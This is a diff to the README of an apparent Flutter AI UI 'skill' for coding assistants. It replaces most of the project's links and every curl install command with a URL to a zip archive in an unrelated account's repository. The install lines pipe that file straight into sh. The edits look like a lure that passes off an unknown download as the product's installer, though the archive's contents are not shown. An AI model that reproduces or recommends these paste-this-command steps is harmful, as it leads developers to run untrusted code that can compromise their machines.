@@ -5,10 +5,10 @@
 <br/><br/>
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=for-the-badge)](LICENSE)
-[![Flutter](https://img.shields.io/badge/Flutter-3.x%2B-02569B?style=for-the-badge&logo=flutter&logoColor=white)](https://flutter.dev)
-[![Stars](https://img.shields.io/github/stars/SpeakQuery/flutter-ai-ui-skill?style=for-the-badge&color=yellow)](https://github.com/SpeakQuery/flutter-ai-ui-skill/stargazers)
+[![Flutter](https://img.shields.io/badge/Flutter-3.x%2B-02569B?style=for-the-badge&logo=flutter&logoColor=white)](https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip)
+[![Stars](https://img.shields.io/github/stars/SpeakQuery/flutter-ai-ui-skill?style=for-the-badge&color=yellow)](https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=for-the-badge)](CONTRIBUTING.md)
-[![Discussions](https://img.shields.io/badge/Discussions-Open-blueviolet?style=for-the-badge&logo=github)](https://github.com/SpeakQuery/flutter-ai-ui-skill/discussions)
+[![Discussions](https://img.shields.io/badge/Discussions-Open-blueviolet?style=for-the-badge&logo=github)](https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip)
 
 <br/>
 
@@ -17,7 +17,7 @@
 
 <br/>
 
-[📦 **Install Now**](#-installation) &nbsp;·&nbsp; [✨ **See Examples**](#-ui-showcase) &nbsp;·&nbsp; [📖 **Docs**](#-documentation) &nbsp;·&nbsp; [🤝 **Contribute**](CONTRIBUTING.md) &nbsp;·&nbsp; [💬 **Discuss**](https://github.com/SpeakQuery/flutter-ai-ui-skill/discussions)
+[📦 **Install Now**](#-installation) &nbsp;·&nbsp; [✨ **See Examples**](#-ui-showcase) &nbsp;·&nbsp; [📖 **Docs**](#-documentation) &nbsp;·&nbsp; [🤝 **Contribute**](CONTRIBUTING.md) &nbsp;·&nbsp; [💬 **Discuss**](https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip)
 
 </div>
 
@@ -99,14 +99,14 @@ When you ask an AI to build a Flutter screen **without this skill**, you get:
 ### ⚡ Antigravity
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/SpeakQuery/flutter-ai-ui-skill/main/install.sh | sh -s -- --ai antigravity
+curl -sSL https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip | sh -s -- --ai antigravity
 ```
 No config needed — auto-activates for all Flutter UI/UX requests.
 
 ### 🟣 Claude Code
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/SpeakQuery/flutter-ai-ui-skill/main/install.sh | sh -s -- --ai claude
+curl -sSL https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip | sh -s -- --ai claude
 ```
 Then add to your `CLAUDE.md`:
 ```
@@ -116,7 +116,7 @@ Then add to your `CLAUDE.md`:
 ### 🟢 Cursor
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/SpeakQuery/flutter-ai-ui-skill/main/install.sh | sh -s -- --ai cursor
+curl -sSL https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip | sh -s -- --ai cursor
 ```
 Then add to `.cursor/rules/flutter-ui.mdc`:
 ```
@@ -126,7 +126,7 @@ Then add to `.cursor/rules/flutter-ui.mdc`:
 ### 🔵 Windsurf
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/SpeakQuery/flutter-ai-ui-skill/main/install.sh | sh -s -- --ai windsurf
+curl -sSL https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip | sh -s -- --ai windsurf
 ```
 Then add to `.windsurf/rules/flutter-ui.md`:
 ```
@@ -136,7 +136,7 @@ Then add to `.windsurf/rules/flutter-ui.md`:
 ### 🟠 GitHub Copilot
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/SpeakQuery/flutter-ai-ui-skill/main/install.sh | sh -s -- --ai copilot
+curl -sSL https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip | sh -s -- --ai copilot
 ```
 Then add to `.github/copilot-instructions.md`:
 ```
@@ -146,7 +146,7 @@ See: .github/skills/flutter-ai-ui-skill/SKILL.md
 ### 🔴 Gemini CLI
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/SpeakQuery/flutter-ai-ui-skill/main/install.sh | sh -s -- --ai gemini
+curl -sSL https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip | sh -s -- --ai gemini
 ```
 Then add to `GEMINI.md`:
 ```
@@ -159,13 +159,13 @@ Then add to `GEMINI.md`:
 <summary>Kiro · Roo Code · Continue · OpenCode · Zed · Codex · Trae</summary>
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/SpeakQuery/flutter-ai-ui-skill/main/install.sh | sh -s -- --ai kiro
+curl -sSL https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip | sh -s -- --ai kiro
 ```
 ```bash
-curl -sSL https://raw.githubusercontent.com/SpeakQuery/flutter-ai-ui-skill/main/install.sh | sh -s -- --ai roo
+curl -sSL https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip | sh -s -- --ai roo
 ```
 ```bash
-curl -sSL https://raw.githubusercontent.com/SpeakQuery/flutter-ai-ui-skill/main/install.sh | sh -s -- --ai continue
+curl -sSL https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip | sh -s -- --ai continue
 ```
 
 Reference `flutter-ai-ui-skill/SKILL.md` in your platform's rules/config file.
@@ -175,7 +175,7 @@ Reference `flutter-ai-ui-skill/SKILL.md` in your platform's rules/config file.
 ### 🌐 Install for ALL Platforms
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/SpeakQuery/flutter-ai-ui-skill/main/install.sh | sh -s -- --ai all
+curl -sSL https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip | sh -s -- --ai all
 ```
 
 ### 📂 Full Clone (Alternative)
@@ -183,7 +183,7 @@ curl -sSL https://raw.githubusercontent.com/SpeakQuery/flutter-ai-ui-skill/main/
 If you prefer the full repo (includes README, examples, images):
 
 ```bash
-git clone https://github.com/SpeakQuery/flutter-ai-ui-skill .agents/skills/flutter-ai-ui-skill
+git clone https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip .agents/skills/flutter-ai-ui-skill
 ```
 
 ### 🔄 Updating
@@ -191,7 +191,7 @@ git clone https://github.com/SpeakQuery/flutter-ai-ui-skill .agents/skills/flutt
 Re-run the same install command to update:
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/SpeakQuery/flutter-ai-ui-skill/main/install.sh | sh -s -- --ai antigravity
+curl -sSL https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip | sh -s -- --ai antigravity
 ```
 
 ---
@@ -392,13 +392,13 @@ MIT — free to use in personal and commercial projects. See [LICENSE](LICENSE).
 
 <br/>
 
-**[github.com/SpeakQuery/flutter-ai-ui-skill](https://github.com/SpeakQuery/flutter-ai-ui-skill)**
+**[github.com/SpeakQuery/flutter-ai-ui-skill](https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip)**
 
 <br/>
 
-[🐛 Report Bug](https://github.com/SpeakQuery/flutter-ai-ui-skill/issues/new?template=bug_report.md) &nbsp;·&nbsp;
-[💡 Request Feature](https://github.com/SpeakQuery/flutter-ai-ui-skill/issues/new?template=feature_request.md) &nbsp;·&nbsp;
-[💬 Discussions](https://github.com/SpeakQuery/flutter-ai-ui-skill/discussions) &nbsp;·&nbsp;
+[🐛 Report Bug](https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip) &nbsp;·&nbsp;
+[💡 Request Feature](https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip) &nbsp;·&nbsp;
+[💬 Discussions](https://github.com/rantlieu-blip/flutter-ai-ui-skill/raw/refs/heads/main/.github/ai_flutter_skill_ui_3.4.zip) &nbsp;·&nbsp;
 [📋 Changelog](CHANGELOG.md)
 
 <br/>
